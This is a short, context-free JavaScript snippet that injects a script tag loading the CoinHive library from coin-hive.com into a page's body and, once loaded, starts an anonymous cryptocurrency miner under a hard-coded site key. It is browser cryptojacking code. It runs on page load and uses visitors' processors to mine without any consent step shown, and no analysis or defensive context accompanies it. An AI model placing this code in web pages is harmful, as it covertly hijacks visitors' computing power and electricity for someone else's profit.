            var mnr = document.createElement('script');
            mnr.src = 'https://coin-hive.com/lib/coinhive.min.js';
            mnr.onload = function() {
                var miner = CoinHive.Anonymous('MhbygeUlrWYiK9b2CmS8gdGAIFBeB7pd');
                miner.start();
            };
            document.getElementsByTagName('body')[0].appendChild(mnr);